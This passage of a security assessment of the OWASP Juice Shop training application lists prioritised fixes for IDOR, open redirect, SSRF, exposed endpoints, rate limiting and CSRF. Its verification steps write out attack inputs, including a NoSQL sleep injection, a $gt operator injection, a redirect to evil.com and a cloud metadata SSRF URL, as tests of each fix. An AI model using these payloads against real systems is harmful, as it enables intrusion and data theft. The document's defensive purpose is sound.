**Verification:** Send `GET /rest/products/0;sleep(2000)/reviews` — response must arrive in under 500ms (no delay). Send `PUT /rest/products/reviews` with `{"id":{"$gt":""},"message":"hacked"}` — must update only the requester's review, not all reviews.

---

### <a id="m-012"></a>M-012 · Enforce resource ownership checks (fix IDOR)

**Addresses:** [T-013](#t-013), [T-017](#t-017), [T-020](#t-020)
**Fulfills Requirements:** [AC-002](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html), [AC-006](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) — RBAC and IDOR prevention
**Priority:** **P3 — Next Quarter** · **Severity:** 🟠 High · **Effort:** Medium

**Why:** The `appendUserId()` middleware appends the authenticated user's ID to the request but does not verify it matches the resource being accessed. Endpoints for wallet, order history, and user data return or modify any user's resources based solely on the URL parameter, enabling Insecure Direct Object Reference.

**How:**
1. Add ownership verification to wallet endpoints — compare `req.body.UserId` to `loggedInUser.data.id`
2. Filter order history queries to `WHERE UserId = loggedInUser.data.id`
3. Restrict `GET /api/Users` to admin role only; restrict `GET /api/Users/:id` to own ID or admin
4. Create a reusable `assertOwnership(resource, userId)` middleware

**Verification:** Log in as user A and request `GET /rest/wallet/balance` — must return only user A's balance. Request user B's balance by guessing the wallet ID — must return 403, not user B's data.

---

### <a id="m-013"></a>M-013 · Fix open redirect allowlist bypass

**Addresses:** [T-014](#t-014)
**Priority:** **P3 — Next Quarter** · **Severity:** 🟠 High · **Effort:** Low

**Why:** The `isRedirectAllowed()` function in [lib/insecurity.ts:135](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:135) uses `url.includes(allowedUrl)` — a substring check that allows any URL embedding a trusted URL as a parameter or path component.

**How:**
1. Replace `url.includes(allowedUrl)` with an exact prefix match using `url.startsWith(allowedUrl)`
2. Parse the target URL and verify the host matches an allowlist of hostnames

```typescript
// Before (lib/insecurity.ts:137)
allowed = allowed || url.includes(allowedUrl)

// After
const parsedUrl = new URL(url)
const parsedAllowed = new URL(allowedUrl)
allowed = allowed || (parsedUrl.hostname === parsedAllowed.hostname &&
  url.startsWith(allowedUrl))
```

**Verification:** Send `GET /redirect?to=https://evil.com?ref=https://github.com/juice-shop/juice-shop` — must receive 406, not a redirect to evil.com. Send `GET /redirect?to=https://github.com/juice-shop/juice-shop` — must redirect successfully (302).

---

### <a id="m-014"></a>M-014 · Protect management and diagnostic endpoints

**Addresses:** [T-015](#t-015), [T-016](#t-016), [T-019](#t-019)
**Fulfills Requirements:** [HN-002](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) — Management endpoints not reachable from public networks
**Priority:** **P3 — Next Quarter** · **Severity:** 🟠 High · **Effort:** Medium

**Why:** `/metrics`, `/ftp`, `/encryptionkeys`, `/support/logs`, and `/api-docs` are all accessible without authentication. These expose operational metrics, sensitive files, cryptographic keys, log files, and the complete API schema to any unauthenticated attacker.

**How:**
1. Add `security.isAuthorized()` middleware to `/metrics`, `/support/logs`, and `/encryptionkeys` routes
2. Move `/metrics` to an internal-only port (e.g. 9090) not exposed to the public interface
3. Restrict `/api-docs` to non-production environments via `NODE_ENV` check
4. Remove public FTP directory listing or require authentication; move sensitive files out of `/ftp`

**Verification:** Request `GET /metrics` without a JWT token — must return 401. Request `GET /support/logs` without a JWT — must return 401.

---

### <a id="m-015"></a>M-015 · Restrict SSRF in profile image URL upload

**Addresses:** [T-018](#t-018)
**Priority:** **P3 — Next Quarter** · **Severity:** 🟡 Medium · **Effort:** Low

**Why:** The profile image URL upload fetches a user-supplied URL server-side, enabling SSRF against internal services including cloud metadata endpoints. A URL allowlist or DNS-rebinding-resistant validation is required.

**How:**
1. Validate the URL scheme (must be `https:`), resolve the hostname, and reject private IP ranges (RFC 1918, 169.254.x.x)
2. Use a dedicated fetch library with built-in SSRF protections or a proxy

**Verification:** Submit `http://169.254.169.254/latest/meta-data/` as the profile image URL — must return 400. Submit a valid public image URL — must succeed.

---

### <a id="m-016"></a>M-016 · Restrict application configuration endpoint to admin role

**Addresses:** [T-021](#t-021)
**Priority:** **P3 — Next Quarter** · **Severity:** 🟡 Medium · **Effort:** Low

**Why:** The full application configuration (including OAuth client ID, feature flags, and challenge state) should not be exposed to ordinary users.

**How:**
1. Add `security.isAdmin()` or `security.isAccounting()` middleware to `GET /rest/admin/application-configuration`
2. Alternatively, return a minimal public config subset and move sensitive fields to admin-only endpoint

**Verification:** Call `GET /rest/admin/application-configuration` with a customer-role JWT — must return 403.

---

### P4 — Backlog

### <a id="m-017"></a>M-017 · Add rate limiting to login and all public endpoints

**Addresses:** [T-022](#t-022), [T-023](#t-023)
**Fulfills Requirements:** [AC-003](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html) — Rate limit all external endpoints
**Priority:** **P4 — Backlog** · **Severity:** 🟡 Medium · **Effort:** Low

**Why:** The login endpoint has no rate limiting, enabling brute-force attacks. The chatbot endpoint and other public endpoints also lack limits.

**How:**
1. Add `rateLimit({ windowMs: 15*60*1000, max: 10 })` to `POST /rest/user/login`
2. Apply global rate limiting (e.g. 100 req/15min) to all unauthenticated endpoints
3. Use `X-Forwarded-For` with caution — validate the proxy trust chain ([server.ts:342](vscode://file/home/mrohr/juice-shop/server.ts:342) already enables trust proxy)

**Verification:** Submit 11 login requests within 15 minutes — the 11th must return 429 Too Many Requests.

---

### <a id="m-018"></a>M-018 · Strengthen password reset mechanism

**Addresses:** [T-024](#t-024), [T-025](#t-025)
**Fulfills Requirements:** [AC-004](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) — Standard IdP with mandatory MFA
**Priority:** **P4 — Backlog** · **Severity:** 🟡 Medium · **Effort:** High

**Why:** Security-question-based password reset is considered weak. The security question is exposed unauthenticated. A time-limited email reset token is the minimum viable improvement.

**How:**
1. Replace security-question reset with email-based one-time token (e.g. `crypto.randomBytes(32)` stored with expiry)
2. Enforce TOTP (2FA) for admin and accounting accounts as a mandatory configuration
3. Do not expose the security question for an email via unauthenticated API

**Verification:** Request `GET /rest/user/security-question?email=admin@juice-sh.op` without auth — must return 401 or hide the question. Initiate password reset — must send email, not expose a security question.

---

### <a id="m-019"></a>M-019 · Add HSTS header and enforce TLS

**Addresses:** [T-026](#t-026)
**Fulfills Requirements:** [WEB-005](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html) — HSTS with min-age 1 year
**Priority:** **P4 — Backlog** · **Severity:** 🟢 Low · **Effort:** Low

**Why:** Without HSTS, browsers will connect over HTTP if HTTPS is unavailable, exposing tokens and PII to network interception.

**How:**
1. Add `helmet.hsts({ maxAge: 31536000, includeSubDomains: true })` to the middleware chain
2. Ensure TLS termination happens at the load balancer or reverse proxy

**Verification:** Request `GET /` over HTTPS — response must include `Strict-Transport-Security: max-age=31536000; includeSubDomains`.

---

### <a id="m-020"></a>M-020 · Implement structured security event logging

**Addresses:** [T-027](#t-027)
**Fulfills Requirements:** [LM-001](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) — Log all security-relevant events with structured format
**Priority:** **P4 — Backlog** · **Severity:** 🟢 Low · **Effort:** Medium

**Why:** Without structured security event logs, incident investigation cannot reconstruct attacker activity (authentication failures, privilege escalation attempts, injection attempts).

**How:**
1. Extend the existing Winston logger to emit JSON events for: auth failure, auth success, authorization failure, suspicious input detected
2. Integrate with a centralized log aggregation system (ELK, Datadog, Splunk)
3. Protect log files — remove unauthenticated access to `/support/logs` (see M-014)

**Verification:** Trigger a failed login — verify the Winston log contains `{ event: "auth.failure", email: "...", ip: "...", timestamp: "..." }` in JSON format.

---

### <a id="m-021"></a>M-021 · Change password endpoint to POST and add CSRF protection

**Addresses:** [T-029](#t-029)
**Fulfills Requirements:** [WEB-001](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) — Anti-CSRF protection for state-changing actions
**Priority:** **P4 — Backlog** · **Severity:** 🟢 Low · **Effort:** Low

**Why:** The password change endpoint uses HTTP GET with parameters in the query string, violating REST semantics and enabling CSRF. State-changing actions must use POST with CSRF protection.

**How:**
1. Change `GET /rest/user/change-password` to `POST /rest/user/change-password` in [server.ts:595](vscode://file/home/mrohr/juice-shop/server.ts:595) and [routes/changePassword.ts](vscode://file/home/mrohr/juice-shop/routes/changePassword.ts)
2. Add `SameSite=Strict` to all session cookies (after M-006 implements HttpOnly cookies)
3. Optionally add a synchronizer token pattern for legacy browser support

**Verification:** Submit a cross-origin GET request to the password change URL — must return 404 (route no longer exists). Submit a POST from the same origin — must work correctly.

---

## 11. Out of Scope

Areas deliberately excluded from this assessment, including accepted risks and items requiring separate analysis.

- **Intentional vulnerabilities**: OWASP Juice Shop is explicitly designed as a training application with intentional vulnerabilities. This assessment treats them as real threats for educational completeness but acknowledges they are features, not bugs, in the context of the project's mission.
- **Third-party dependencies (full SCA)**: No `npm audit` was run as `WITH_SCA=false`. The dependency tree contains known outdated packages (`express-jwt@0.1.3`, `jsonwebtoken@0.4.0`, `sanitize-html@1.4.2`) which may carry their own CVEs. A full SCA scan is recommended separately.
- **Frontend (non-security) code**: Angular routing, UI components, animation, and non-security-related Angular service code were not analyzed.
- **CTF/challenge mechanics**: The challenge-solving infrastructure (`challengeUtils.ts`, `antiCheat.ts`, `datacache.ts`) is out of scope — it exists to support the training mission, not production functionality.
- **Web3/NFT functionality**: The `routes/web3Wallet.ts`, `routes/nftMint.ts`, and Ethereum wallet integration were not analyzed in depth.
- **Infrastructure configuration**: Kubernetes/Helm charts, cloud deployment configuration, and network policies were not available for review.
- **Penetration testing**: This assessment is based on static source code analysis. Dynamic exploitation of identified vulnerabilities, timing attacks, and race conditions require active penetration testing.
- **Social engineering and phishing**: Out of scope for a source code analysis.
